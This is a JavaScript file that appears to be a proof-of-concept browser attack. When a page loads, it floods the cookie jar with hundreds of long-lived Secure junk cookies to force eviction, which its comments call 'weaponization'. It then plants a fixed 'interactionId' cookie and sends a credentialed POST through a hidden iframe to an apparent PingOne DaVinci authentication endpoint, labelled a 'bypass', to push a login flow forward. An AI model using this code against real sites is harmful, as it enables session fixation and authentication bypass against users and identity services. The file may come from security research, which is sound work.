//start
function forceHighPriorityEviction() {
    // Safety lock for the cookie flooding
    if (localStorage.getItem("priority_test_done") === "true") {
        console.log("Cookie flood already run. Skipping.");
        return;
    }

    console.log("Starting High-Priority Eviction Test...");
    
    // Firefox often needs ~1000 to trigger the batch purge. Chrome ~180.
    const COOKIE_COUNT = 700; 

    try {
        for (let i = 0; i < COOKIE_COUNT; i++) {
            let name = "priority_junk_" + i;
            let value = "fill_" + Date.now();
            
            // WEAPONIZATION:
            // 1. Add 'Secure' to match the target's priority.
            // 2. Add 'Max-Age' (1 year) so the browser thinks these are long-term preferences.
            // 3. Add 'SameSite=Lax' to mimic standard session cookies.
            document.cookie = `${name}=${value}; path=/; Secure; Max-Age=31536000; SameSite=Lax`;
        }

        console.log(`Flooded jar with ${COOKIE_COUNT} Secure cookies.`);
        
        // Mark the flood as done
        localStorage.setItem("priority_test_done", "true");

    } catch (e) {
        console.error("Error:", e);
    }
}

function restoreBrowserState() {
    console.log("Initiating cleanup of stress-test cookies...");
    
    const cookies = document.cookie.split(";");
    let removedCount = 0;

    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i];
        const eqPos = cookie.indexOf("=");
        const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();

        // Target only the specific pattern used in the stress test
        if (name.startsWith("priority_junk_")) {
            // Delete the cookie by expiring it in the past
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/; Secure";
            removedCount++;
        }
    }

    // NOTE: We remove the 'priority_test_done' flag here so the flooding can happen again if needed,
    // but we DO NOT remove the window lock key here to prevent popup spam.
    localStorage.removeItem("priority_test_done");
    localStorage.removeItem("cookie_stress_test_done");

    console.log(`Cleanup complete. Removed ${removedCount} cookies.`);
}

function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
    console.log(`Cookie '${name}' created!`);
}

// Helper to get a cookie value by name
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// WRAPPER: The Bypass Logic is now in a function
function runIframeBypass() {
    console.log("⏳ Starting Bypass Sequence...");

    // 1. Get the Interaction ID (Now guaranteed to check AFTER setCookie runs)
    const currentInteractionId = getCookie("interactionId");

    if (!currentInteractionId) {
        console.error("❌ Error: Could not find 'interactionId' cookie. Are you on the right domain?");
        return;
    } 

    console.log(`✅ Found Interaction ID: ${currentInteractionId}`);

    // 2. Setup URL
    const baseUrl = "https://auth.ort-one-pingone.com";
    const endpoint = "/01a2cd57-e4da-4d1c-aa5e-30ce0ccbe8d4/davinci/connections/867ed4363b2bc21c860085ad2baa817d/capabilities/customHtmlMessage";
    const targetUrl = baseUrl + endpoint;

    // 3. Define Payload using the DYNAMIC ID
    const payload = {
        "nextEvent": {
            "constructType": "skEvent",
            "eventName": "continue",
            "params": [],
            "eventType": "post",
            "postProcess": {}
        },
        "eventName": "continue",
        "id": "367v607nhz",
        "interactionId": currentInteractionId
    };

    // 4. Create Clean Iframe
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const cleanFetch = iframe.contentWindow.fetch;

    console.log("🚀 Sending 'no-cors' Bypass Request...");

    // 5. Send Request
    cleanFetch(targetUrl, {
        method: "POST",
     // mode: 'no-cors',
        credentials: 'include', 
        headers: {
            //'Content-Type': 'text/plain' 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(() => {
        console.log("✅ Request Sent (Response is Opaque/Hidden)");
        // Cleanup after a delay to ensure request cleared
        setTimeout(() => document.body.removeChild(iframe), 2000);
    })
    .catch(err => {
        console.error("❌ Request Failed:", err);
    });
}

// MAIN EXECUTION BLOCK
document.addEventListener('DOMContentLoaded', (event) => {
    console.log("JavaScript is running!");
    
    // 1. Run Eviction/Cleanup First
    forceHighPriorityEviction();
    restoreBrowserState();
    
    // 2. Set the critical cookie
    setCookie("interactionId", "00d72600-1ad1-4053-9d9a-7bc5d96f48ef", 7);
    
    // 3. UI Updates
    const heading = document.getElementById('main-heading');
    if (heading) {
        heading.textContent = "JS Ran! Title Updated Successfully.";
        heading.style.color = 'blue';
    }

    // 4. RUN FETCH ABSOLUTELY LAST
    // We use a small timeout to push this to the end of the execution stack,
    // ensuring the cookie jar is settled and the DOM is fully painted.
    setTimeout(() => {
        runIframeBypass();
    }, 500);
});
